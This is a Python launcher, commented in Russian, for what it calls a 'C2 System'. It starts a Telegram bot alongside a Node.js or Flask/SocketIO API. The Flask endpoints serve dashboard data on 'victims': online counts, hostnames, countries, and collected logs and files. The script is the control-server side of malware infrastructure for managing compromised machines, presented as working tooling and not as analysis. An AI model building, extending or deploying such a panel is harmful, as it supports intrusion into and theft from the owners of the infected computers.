#!/usr/bin/env python3
# main.py - Корневой файл для запуска бота и API сервера

import os
import sys
import threading
import time
import subprocess
import logging
from pathlib import Path

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/main.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)


# ========== Функции для запуска компонентов ==========

def run_telegram_bot():
    """Запуск Telegram бота"""
    try:
        logger.info("Starting Telegram bot...")
        # Добавляем путь к проекту в sys.path
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

        # Импортируем и запускаем бота
        from bot.main import main as bot_main
        bot_main()
    except Exception as e:
        logger.error(f"Error starting Telegram bot: {e}")
        # Пытаемся запустить как подпроцесс, если импорт не удался
        try:
            subprocess.run([sys.executable, "-m", "bot.main"], check=True)
        except Exception as e2:
            logger.error(f"Also failed to run as subprocess: {e2}")


def run_api_server():
    """Запуск Node.js API сервера"""
    try:
        logger.info("Starting Node.js API server...")
        # Проверяем, установлен ли Node.js
        subprocess.run(["node", "--version"], check=True, capture_output=True)

        # Запускаем Node.js сервер
        process = subprocess.Popen(
            ["npm", "start"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )

        # Выводим логи Node.js в реальном времени
        for line in process.stdout:
            logger.info(f"[API] {line.strip()}")

    except subprocess.CalledProcessError:
        logger.error("Node.js is not installed or npm start failed")
    except FileNotFoundError:
        logger.error("Node.js not found. Please install Node.js")
    except Exception as e:
        logger.error(f"Error starting API server: {e}")


def run_flask_api():
    """Альтернатива: запуск Flask API сервера (если не хотите использовать Node.js)"""
    try:
        logger.info("Starting Flask API server...")
        # Создаем простой Flask сервер для API
        from flask import Flask, jsonify
        from flask_cors import CORS
        from flask_socketio import SocketIO, emit

        app = Flask(__name__)
        CORS(app)
        socketio = SocketIO(app, cors_allowed_origins="*")

        @app.route('/api/stats')
        def stats():
            # Здесь должна быть логика получения статистики из БД
            return jsonify({
                "total_victims": 42,
                "online_victims": 7,
                "total_logs": 1250,
                "total_files": 89,
                "countries": {"US": 15, "RU": 10, "DE": 5}
            })

        @app.route('/api/victims')
        def victims():
            return jsonify([
                {"victim_id": "victim_1", "hostname": "DESKTOP-ABC", "country": "US", "is_online": True},
                {"victim_id": "victim_2", "hostname": "LAPTOP-XYZ", "country": "RU", "is_online": False}
            ])

        @app.route('/ping')
        def ping():
            return "pong"

        @socketio.on('connect')
        def handle_connect():
            logger.info("Client connected to WebSocket")

        # Запускаем Flask-SocketIO сервер
        socketio.run(app, host='0.0.0.0', port=int(os.getenv('PORT', 5000)), debug=False, use_reloader=False)

    except ImportError:
        logger.error("Flask not installed. Run: pip install flask flask-cors flask-socketio")
    except Exception as e:
        logger.error(f"Error starting Flask API: {e}")


# ========== Основная функция ==========

def main():
    """Главная функция запуска"""
    logger.info("=" * 50)
    logger.info("Starting C2 System...")
    logger.info("=" * 50)

    # Создаем необходимые директории
    Path("logs").mkdir(exist_ok=True)
    Path("database").mkdir(exist_ok=True)
    Path("webpanel/dist").mkdir(parents=True, exist_ok=True)

    # Поток для Telegram бота
    bot_thread = threading.Thread(target=run_telegram_bot, name="TelegramBot")
    bot_thread.daemon = True
    bot_thread.start()
    logger.info("Telegram bot thread started")

    # Небольшая пауза, чтобы бот успел инициализироваться
    time.sleep(2)

    # Выбираем тип API сервера
    # Вариант 1: Node.js (рекомендуется, если у вас есть package.json)
    # run_api_server()

    # Вариант 2: Flask (если не хотите использовать Node.js)
    run_flask_api()

    # Если оба API не запустились, ждем и держим процесс живым
    try:
        while True:
            time.sleep(10)
            # Проверяем, живы ли потоки
            if not bot_thread.is_alive():
                logger.warning("Bot thread died, restarting...")
                bot_thread = threading.Thread(target=run_telegram_bot, name="TelegramBot")
                bot_thread.daemon = True
                bot_thread.start()
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        sys.exit(0)


if __name__ == "__main__":
    main()